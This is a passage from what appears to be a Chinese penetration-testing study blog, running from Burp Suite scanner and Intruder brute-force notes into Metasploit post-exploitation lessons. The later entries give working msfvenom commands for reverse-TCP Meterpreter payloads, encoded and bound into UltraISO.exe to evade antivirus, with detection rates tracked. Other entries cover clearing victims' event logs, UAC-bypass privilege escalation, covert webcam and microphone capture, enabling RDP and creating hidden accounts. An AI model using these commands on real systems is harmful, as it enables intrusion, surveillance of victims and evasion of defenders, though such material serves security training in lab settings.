</p><p>客户端的漏洞，如XSS 、HTTP头注入、操作重定向。</p><p>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</p></li></ul><h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><ol><li><p>方式：只检测经过BP代理服务器的地址，不爬取</p></li><li><p>特点：发送有限请求</p></li><li><p>使用场合：生产环境</p></li><li><p>针对漏洞：</p></li></ol><ul><li><p>提交的密码为未加密的明文。</p></li><li><p>不安全的cookie的属性，例如缺少HttpOnly和安全标志。</p></li><li><p>cookie的范围缺失。 </p></li><li><p>跨域脚本包含和站点引用泄露。 </p></li><li><p>表单值自动填充，尤其是密码。 </p></li><li><p>SSL保护的内容缓存。 </p></li><li><p>目录列表。 </p></li><li><p>提交密码后应答延迟。 </p></li><li><p>session令牌的不安全传输。 </p></li><li><p>敏感信息泄露，例如内部IP地址、电子邮件地址、堆枝跟踪等信息泄露。 </p></li><li><p>不安全的ViewState 的配置。 </p></li><li><p>错误或不规范的Content-Type指令。</p></li></ul><h2 id="使用BP漏扫功能"><a href="#使用BP漏扫功能" class="headerlink" title="使用BP漏扫功能"></a>使用BP漏扫功能</h2><h3 id="主动扫描的类型"><a href="#主动扫描的类型" class="headerlink" title="主动扫描的类型"></a>主动扫描的类型</h3><p><img src="assets/image-20221220083555554.png" alt="image-20221220083555554"></p><p>Crawl 爬行（建立站点地图） </p><p>Audit 审计（扫描漏洞）</p><p>Scan Configuration：爬行和审计的设置</p><p> Application login：账号密码</p><p> Resouce pool：线程池设置</p><h3 id="爬行配置"><a href="#爬行配置" class="headerlink" title="爬行配置"></a>爬行配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Crwal Optimization</td><td>爬行的优化</td><td>最大链接深度；更快还是更完整</td></tr><tr><td>Crwal Limits</td><td>爬行最大限制</td><td>最大时间；最多链接；最大请求数</td></tr><tr><td>Login Functions</td><td>登录注册</td><td>登录操作：自动注册；用无效的用户名主动触发登录失败</td></tr><tr><td>Handling Application</td><td>错误处理</td><td>爬行过程中的错误处理，比如超 时</td></tr><tr><td>Miscellaneous [ˌmɪsəˈleɪniəs]</td><td>杂项</td><td>杂项</td></tr></tbody></table><h3 id="审计配置"><a href="#审计配置" class="headerlink" title="审计配置"></a>审计配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Audit Optimization</td><td>审计优化</td><td>扫描的速度和精确度</td></tr><tr><td>Issues Reported</td><td>问题报告</td><td>报告哪些漏洞：根据扫描类型或者漏洞类型 来过滤，默认全选</td></tr><tr><td>Handling Application Errors During Audit</td><td>审计过程出错 的处理</td><td>比如连接失败和传输超时默认：如果一个插 入点连续失败两次，就跳过，不再发送请求 （接口挂了） 如果连续两个插入点失败，跳过其他的插入 点（网站挂了）</td></tr><tr><td>Insertion Point Types</td><td>插入点的类型</td><td>URL参数值、Body里面的参数值、Cookie值、 参数名字、HTTP请求头、Body完整内容、 URL文件名、URL目录</td></tr><tr><td>Modifying Parameter Locations</td><td>插入点位置</td><td>替换，交叉检测</td></tr></tbody></table><h3 id="审计配置-1"><a href="#审计配置-1" class="headerlink" title="审计配置"></a>审计配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Ignored insertion Point</td><td>忽略的插入点</td><td></td></tr><tr><td>Frequentcly Occurring Insertion Points</td><td>插入点相同时</td><td>当大量的插入点结果没有区别的 时候，更加高效地扫描。</td></tr><tr><td>Misc Insertion Point Options</td><td>杂项</td><td>一个插入点的最大请求数量</td></tr><tr><td>Java Script Analysis</td><td>JavaScript审计</td><td></td></tr></tbody></table><h3 id="主动扫描的类型-1"><a href="#主动扫描的类型-1" class="headerlink" title="主动扫描的类型"></a>主动扫描的类型</h3><p>Scan：输入URL或者URL右键 </p><p>Live Task：从其他模块获取到流量 </p><p>Live Task： </p><p>Audit 不会爬行 </p><p>passive crawl 会爬行</p><h2 id="生成扫描报告"><a href="#生成扫描报告" class="headerlink" title="生成扫描报告"></a>生成扫描报告</h2><h3 id="扫描报告"><a href="#扫描报告" class="headerlink" title="扫描报告"></a>扫描报告</h3><p><img src="assets/image-20221220084534787.png" alt="image-20221220084534787"></p><p>右键导出</p><p><a href="https://portswigger.net/burp/samplereport/burpscannersamplereport">https://portswigger.net/burp/samplereport/burpscannersamplereport</a></p><h1 id="Burp-Repeater"><a href="#Burp-Repeater" class="headerlink" title="Burp Repeater"></a>Burp Repeater</h1><h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">https://portswigger.net/burp/documentation/desktop/tools/repeater</a></p><h2 id="Repeater模块作用"><a href="#Repeater模块作用" class="headerlink" title="Repeater模块作用"></a>Repeater模块作用</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol><li>发起HTTP请求，分析响应 </li><li>重放请求</li></ol><h2 id="Repeater使用方法"><a href="#Repeater使用方法" class="headerlink" title="Repeater使用方法"></a>Repeater使用方法</h2><h3 id="内容来源"><a href="#内容来源" class="headerlink" title="内容来源"></a>内容来源</h3><ol><li>从其他模块发送（Ctrl +R ） </li><li>手动填入</li></ol><h1 id="Burp-Intrude"><a href="#Burp-Intrude" class="headerlink" title="Burp Intrude"></a>Burp Intrude</h1><h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder">https://portswigger.net/burp/documentation/desktop/tools/intruder</a></p><h2 id="Intruder模块作用与原理"><a href="#Intruder模块作用与原理" class="headerlink" title="Intruder模块作用与原理"></a>Intruder模块作用与原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="http://xxx.wuya.com/bbs/index.php?name=wuyanzu&amp;motto=go">http://xxx.wuya.com/bbs/index.php?name=wuyanzu&amp;motto=go</a> </p><p>对请求参数进行修改，分析响应内容，获得特征数据 </p><p>本质： </p><ol><li>自动化发起HTTP请求 </li><li>基于现成字典或者生成字典</li></ol><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ol><li>猜测用户名、密码等 </li><li>寻找参数、目录等 </li><li>枚举商品ID、验证码等</li><li>模糊测试（FUZZ）</li><li>…….</li></ol><p>可替代工具： </p><p>wfuzz（全部功能）、dirb（目录扫描）、hydra（暴 破）……</p><h2 id="Intruder实现暴力破解"><a href="#Intruder实现暴力破解" class="headerlink" title="Intruder实现暴力破解"></a>Intruder实现暴力破解</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>从其他模块发送或者手动填写 </li><li>选择攻击模式 Attack type </li><li>选择攻击字段 Positions </li><li>设置payload </li><li>其他设置（线程池等） </li><li>发起攻击 </li><li>查看结果</li></ol><h3 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h3><ul><li>Sniper 狙击手 </li><li>Battering ram 攻城锤 </li><li>Pitchfork 草叉 </li><li>Cluster bomb 榴霰[xiàn]弹</li></ul><h3 id="payload-type"><a href="#payload-type" class="headerlink" title="payload type"></a>payload type</h3><table><thead><tr><th>类别</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Simple list</td><td>简单字典</td><td>添加、粘贴或者从文件读取字典，或者使用预定义的字典</td></tr><tr><td>Runtime file</td><td>运行时文件</td><td>运行时，Burp Intruder将读取文件的每一行作为一个 Payload</td></tr><tr><td>Custom iterator</td><td>自定义迭代器</td><td>这个是占位填充的一种方式，最多8位</td></tr><tr><td>Character substitution</td><td>字符替换</td><td>把字典里面相应的字符进行替换</td></tr><tr><td>Case modification</td><td>大小写修改</td><td>要不要保持原样的，要不要全部大写的，要不要全小写的， 要不要驼峰命名的</td></tr><tr><td>Recrusvive grep</td><td>递归查找</td><td>用来提取相应数据的比如拿到PHPSESSIONID，拿到TOKEN 等等，可以通过格式匹配抓取到对应的字段值。</td></tr><tr><td>Illegal unicode</td><td>非法Unicode 编码</td><td>用于绕过正则表达式的过滤验证</td></tr><tr><td>Character blocks</td><td>字符块</td><td>比如生成100A，200个+号，300个数字1等等</td></tr><tr><td>numbers</td><td>数字组合</td><td></td></tr><tr><td>dates</td><td>日期组合</td><td></td></tr><tr><td>Brute forcer</td><td>暴力破解</td><td>暴力枚举，最后一位先固定，然后一个个改</td></tr><tr><td>Null payloads</td><td>空payload</td><td>不需要设置payload</td></tr><tr><td>Character frobber</td><td>字符frobber</td><td>依次修改指定字符串在每个字符位置的值，每次都是在原字 符上递增一个该字符的ASCII码。</td></tr><tr><td>Bit flipper</td><td>Bit翻转</td><td>对预设的Payload原始值，按照比特位，依次进行修改</td></tr><tr><td>Username generator</td><td>用户名生成器</td><td>主要用于用户名和email帐号的自动生成</td></tr><tr><td>ECB block shuffler</td><td>ECB加密块洗牌</td><td>基于ECB加密模式的Payload生成器</td></tr><tr><td>Extension-generated</td><td>Burp Payload 生成插件</td><td>基于Burp插件来生成Payload值，需要安装插件</td></tr><tr><td>Copy other payload</td><td>Payload复制</td><td>是将其他位置的参数复制到Payload位置上（比如密码要输 入两遍）</td></tr></tbody></table><p><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types">https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types</a></p><h2 id="Intruder其他攻击模式"><a href="#Intruder其他攻击模式" class="headerlink" title="Intruder其他攻击模式"></a>Intruder其他攻击模式</h2><h3 id="Battering-ram-攻城锤"><a href="#Battering-ram-攻城锤" class="headerlink" title="Battering ram 攻城锤"></a>Battering ram 攻城锤</h3><p>所有字段的值相同，来自同一个字典</p><h3 id="Pitchfork-草叉"><a href="#Pitchfork-草叉" class="headerlink" title="Pitchfork 草叉"></a>Pitchfork 草叉</h3><p>从多个字典提取值，赋给多个字段，按顺序一一对应 </p><p>例如： </p><ul><li>100个用户名 </li><li>50个密码 </li><li>最终请求次数：50次</li></ul><h3 id="Cluster-bomb-榴霰弹"><a href="#Cluster-bomb-榴霰弹" class="headerlink" title="Cluster bomb 榴霰弹"></a>Cluster bomb 榴霰弹</h3><p>所有字典全部交叉验证 </p><p>例如： </p><ul><li>100个用户名 </li><li>50个密码 </li><li>最终请求次数：5000次</li></ul><h2 id="Intruder标记结果"><a href="#Intruder标记结果" class="headerlink" title="Intruder标记结果"></a>Intruder标记结果</h2><h3 id="Grep-Match"><a href="#Grep-Match" class="headerlink" title="Grep Match"></a>Grep Match</h3><p><img src="assets/image-20221220091129176.png" alt="image-20221220091129176"></p><h2 id="Intruder获得CSRF-Token"><a href="#Intruder获得CSRF-Token" class="headerlink" title="Intruder获得CSRF Token"></a>Intruder获得CSRF Token</h2><h3 id="Grep-Extract"><a href="#Grep-Extract" class="headerlink" title="Grep Extract"></a>Grep Extract</h3><p><img src="assets/image-20221220091307639.png" alt="image-20221220091307639"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/30.3-msf-qing-li-shi-jian-ri-zhi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/30.3-msf-qing-li-shi-jian-ri-zhi/</url>
      
        <content type="html"><![CDATA[<p>再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 <code>clearev</code> 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。</p><p>![1645511582659](03 msf清理事件日志.assets/1645511582659.png)</p><p>然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。</p><p><code>clearev</code>      清理日志</p><p>![1645511593151](03 msf清理事件日志.assets/1645511593151.png)</p><p>（注意 使用clearev命令时 需要获得靶机的 <strong>system  权限</strong>）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/30.2-msf-bian-ma-mian-sha/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/30.2-msf-bian-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<ol><li><p>杀软是如何检测出恶意代码的？</p><p>​特征码、启发式恶意软件检查和行为。</p></li><li><p>免杀是做什么？</p><p>​对特征进行混淆，打乱代码，避免杀毒软件查杀</p></li><li><p>免杀的基本方法有哪些？</p><p>​自编码处理  自捆绑+编码  多重编码   接口下载式  签名伪装式</p></li></ol><p>针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：</p><p>改变特征码<br>改变行为<br>其它</p><p>由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果</p><p>要用到的在线查毒工具virscan提供</p><p><a href="https://www.virscan.org/">https://www.virscan.org/</a></p><h1 id="一、不处理payload直接生成样本进行检测"><a href="#一、不处理payload直接生成样本进行检测" class="headerlink" title="一、不处理payload直接生成样本进行检测"></a>一、不处理payload直接生成样本进行检测</h1><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -f exe -o payload1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511560404](02 msf编码免杀.assets/1645511560404.png)</p><p>进行查毒有41%的杀毒软件报毒了</p><p>具体查毒结果链接：</p><p><a href="https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9">https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9</a></p><p>![1645511550808](02 msf编码免杀.assets/1645511550808.png)</p><h1 id="二、-MSF自编码处理payload生成样本进行检测"><a href="#二、-MSF自编码处理payload生成样本进行检测" class="headerlink" title="二、 MSF自编码处理payload生成样本进行检测"></a>二、 MSF自编码处理payload生成样本进行检测</h1><p>首先我们输入   <code>msfvenom --list encoders</code>   查看可以用编码模块</p><p>![1645511543145](02 msf编码免杀.assets/1645511543145.png)</p><p>我们使用  <code>x86/shikata_ga_nai</code> 模块 免杀中使用频率最高的一个编码器</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.70.3  LPORT=4456 -f exe -o payload1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查毒有37%的杀毒软件报毒了</p><p>![1645511533351](02 msf编码免杀.assets/1645511533351.png)</p><h1 id="三、MSF自捆绑处理payload生成样本进行检测"><a href="#三、MSF自捆绑处理payload生成样本进行检测" class="headerlink" title="三、MSF自捆绑处理payload生成样本进行检测"></a>三、MSF自捆绑处理payload生成样本进行检测</h1><p>使用msfvenom的**-x参数可以指定一个可执行文件**,将payload与其捆绑</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511525813](02 msf编码免杀.assets/1645511525813.png)</p><p>进行查毒有37%的杀毒软件报毒了</p><p>![1645511516751](02 msf编码免杀.assets/1645511516751.png)</p><h1 id="四、MSF自捆绑-编码处理payload生成样本进行检测"><a href="#四、MSF自捆绑-编码处理payload生成样本进行检测" class="headerlink" title="四、MSF自捆绑+编码处理payload生成样本进行检测"></a>四、MSF自捆绑+编码处理payload生成样本进行检测</h1><p>结合第二种，第三种。编码方式我们再次生成样本</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511507586](02 msf编码免杀.assets/1645511507586.png)</p><p>进行查毒有31%的杀毒软件报毒了</p><p>![1645511497457](02 msf编码免杀.assets/1645511497457.png)</p><p>那我们<strong>继续增加编码次数</strong></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查毒有27%的杀毒软件报毒了!</p><p>![1645511487704](02 msf编码免杀.assets/1645511487704.png)</p><h1 id="五、MSF多重编码payload生成样本进行检测"><a href="#五、MSF多重编码payload生成样本进行检测" class="headerlink" title="五、MSF多重编码payload生成样本进行检测"></a>五、MSF多重编码payload生成样本进行检测</h1><p>通过管道，让msfvenom用不同编码器反复编码进行混淆。使用管道让msfvenom对攻击载荷多重编码，<strong>先用shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码</strong>，最后才生成<strong>以UltraISO.exe为模板</strong>的可执行文件payload5.exe。</p><pre class="line-numbers language-none"><code class="language-none">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.70.3 LPORT=4456 -f raw | msfvenom -p windows/meterpreter/reverse_tcp -e x86/alpha_upper -i 10 -f raw | msfvenom -p windows/meterpreter/reverse_tcp -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六、-生成Shellcode使用C语言调用"><a href="#六、-生成Shellcode使用C语言调用" class="headerlink" title="六、 生成Shellcode使用C语言调用"></a>六、 生成Shellcode使用C语言调用</h1><p>1、直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码。命令：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -f c &gt;c0001.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511458128](02 msf编码免杀.assets/1645511458128.png)</p><p>2、改c文件，并编译，并加壳</p><p>![1645511469800](02 msf编码免杀.assets/1645511469800.png)</p><p>随便写一个hello world</p><pre class="line-numbers language-none"><code class="language-none">main() {printf("hello world\n");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编译 并加壳</p><p><strong>vmp</strong>加壳工具</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/29-hou-shen-tou-zhi-diao-yong-she-xiang-tou/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/29-hou-shen-tou-zhi-diao-yong-she-xiang-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p><p>2 一台windiows靶机</p><p>3 一台<strong>安卓</strong>设备，没有可以使用模拟器</p><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>靶机获取到meterpreter后我们可以使用  webcam模块实现调用软，硬件摄像头</p><p>webcam模块支持命令</p><table><thead><tr><th>id</th><th>模块名</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td><strong>webcam_list</strong></td><td><strong>列出</strong>靶机中的所有软，硬件摄像头列表，并编号</td></tr><tr><td>2</td><td><strong>webcam_snap</strong></td><td>可调用单个软，硬件摄像头<strong>拍照</strong>，默认调用第一个摄像头</td></tr><tr><td>3</td><td><strong>webcam_stream</strong></td><td>可调用单个软，硬件摄像头<strong>直播</strong>，默认调用第一个摄像头</td></tr></tbody></table><p>1  webcam_list</p><p><img src="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png" alt="1644494100592"></p><p>2 <code>webcam_snap</code>  调用单个软，硬件摄像头拍照</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-h</code></td><td>显示帮助</td></tr><tr><td>2</td><td><code>-i</code></td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>3</td><td><code>-p</code></td><td>-p  /root “root”设置存储路径</td></tr><tr><td>4</td><td><code>-q</code></td><td>-q  100  “100” 表示存储图片的质量默认为 50</td></tr><tr><td>5</td><td><code>-v</code></td><td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table><p><img src="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png" alt="1644494089950"></p><p>3 <code>webcam_stream</code>  调用单个软，硬件摄像头直播</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-h</code></td><td>显示帮助</td></tr><tr><td>2</td><td><code>-d</code></td><td>-d 100  “100”=100秒   设置流持续时间为100秒   默认为1800</td></tr><tr><td>3</td><td><code>-i</code></td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>4</td><td><code>-q</code></td><td>-q 100  “100”指流质量 默认为50</td></tr><tr><td>5</td><td><code>-s</code></td><td>-s live “live”指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）</td></tr><tr><td>7</td><td><code>-f</code></td><td>-f live  “live”指播放文件的存储地址  默认输出在当前目录</td></tr><tr><td>8</td><td><code>-v</code></td><td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/28-hou-shen-tou-yuan-cheng-kong-zhi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/28-hou-shen-tou-yuan-cheng-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><h4 id="1-rdesktop"><a href="#1-rdesktop" class="headerlink" title="1 rdesktop"></a>1 rdesktop</h4><p>在线安装  rdesktop</p><hr><p>Debian,Ubuntu,kali下使用以下命令</p><p> <code>apt-get install rdesktop</code></p><hr><p>Centos/RedHat可以通过yum命令</p><p><code>yum -y install rdesktop</code></p><h4 id="2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）"><a href="#2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）" class="headerlink" title="2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）"></a>2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）</h4><h4 id="MSF-Metasploit-Framework"><a href="#MSF-Metasploit-Framework" class="headerlink" title="MSF-Metasploit Framework"></a>MSF-Metasploit Framework</h4><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>1 使用rdesktop远程控制</p><p>说明：rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本</p><p>rdesktop常用参数</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-u</code></td><td>账户名</td></tr><tr><td>2</td><td><code>-p</code></td><td>密码</td></tr><tr><td>3</td><td><code>-a 16</code></td><td>指使用16位色显示远程画面</td></tr><tr><td>4</td><td><code>-f</code></td><td>全屏模式（用<strong>Ctrl+Alt+Enter</strong> 组合键退出全屏）</td></tr><tr><td>5</td><td><code>-g</code></td><td>设置分辨率 如 :   -g 1024x768</td></tr><tr><td>6</td><td><code>rdesktop -h</code></td><td>查看rdesktop使用帮助</td></tr></tbody></table><p>rdesktop -u 用户名 -p  密码  -f   IP</p><p><code>rdesktop -u mb -p 123456 -f 192.168.70.14</code></p><p>如果<strong>远程计算机</strong>没有启动远程功能我们可以在meterpreter中输入</p><p><strong>启动远程桌面协议</strong>：<code>run post/windows/manage/enable_rdp</code></p><hr><p>2 通过vnc远程 </p><p><code>run vnc</code></p><p>![1644493726723](27 后渗透远程控制.assets/1644493726723.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/26-hou-shen-tou-zhi-ti-quan-windows/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/26-hou-shen-tou-zhi-ti-quan-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p><p>2 一台windiows靶机</p><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid</p><p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png" alt="1644493116225"></p><p>方法一、 meterpreter中输入：<code>getsystem</code></p><p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png" alt="1644493125642"></p><p>方法二、使用msf模块提权</p><p>要想提权必须是已经拿到meterpreter  然后将当前meterpreter 后台 meterprerer中输入  <code>background</code></p><p>1、 查看可用模块  MSF终端中输入   <code>search bypassuac</code>   查看提权模块</p><p>2、 选择一个适合当前系统的提权模块  我这边使用的是win10系统</p><p>那我们使用：</p><p><code>use  exploit/windows/local/bypassuac_windows_store_reg</code> </p><p> 尝试提权</p><p>这个模块不行就换一个 </p><p><code>use exploit/windows/local/bypassuac_sluihijack</code></p><p>或者  </p><p><code>use exploit/windows/local/bypassuac_dotnet_profiler</code></p><p>3 配置模块使用参数   终端内输入： <code>show options</code></p><p>4 可以看到需要配置 session  终端内输入：</p><p><code>set session 1</code></p><p>5 执行提权  终端内输入：<code>run</code></p><p>6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功  需要在还终端内在输入 <code>getsystem</code> 获取权限 </p><p>7 获取权限完成后 输入<code>getuid</code> 即可看到  已经获取到SYSTEM 最高权限了</p><p><img src="%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png" alt="1644493163472"></p><p>看到这个证明已经将权限提升成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/25-hou-shen-tou-zhi-diao-yong-yin-pin-she-bei-lu-yin/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/25-hou-shen-tou-zhi-diao-yong-yin-pin-she-bei-lu-yin/</url>
      
        <content type="html"><![CDATA[<p>一、环境准备<br>MSF-Metasploit Framework<br>一台安装手机或者模拟器<br>二、实践</p><p><code>record_mic</code>  包含4个可选参数 分别为</p><p><code>-d</code>  是设置录音时长的</p><p><code>-f</code> 设置未见路径的</p><p><code>-h</code>  查看帮助的</p><p><code>-p</code>  控制自动播放的</p><p>一条简单的录音语句</p><p><code>record_mic -d  10 -p true</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/24-hou-shen-tou-zhi-chuang-jian-zhang-hu-windows/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/24-hou-shen-tou-zhi-chuang-jian-zhang-hu-windows/</url>
      
        <content type="html"><![CDATA[<p>一、环境准备</p><p>1 MSF-Metasploit Framework</p><p>2 一台获取到meterpreter的靶机</p><p>二、实际操作</p><p>1、先看下目标靶机已存在用户  meterpreter中输入：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p><p>![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png) </p><p>2、使用getgui创建 一个用户名为 msb  密码为 123456  的账户</p><p><code>run getgui -u msb -p 123456</code></p><p>run getgui -u {用户名}-p {密码}</p><p>进入win的运行输入<code>netplwiz</code> 可以查看账户创建情况</p><p>![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)</p><p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）</p><p>2.1 绕过UAC提权</p><p><code>use exploit/windows/local/ask</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/21-23-hou-shen-tou-zhi-shang-chuan-xia-zai-wen-jian-ping-mu-jie-tu-jian-pan-ji-lu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/21-23-hou-shen-tou-zhi-shang-chuan-xia-zai-wen-jian-ping-mu-jie-tu-jian-pan-ji-lu/</url>
      
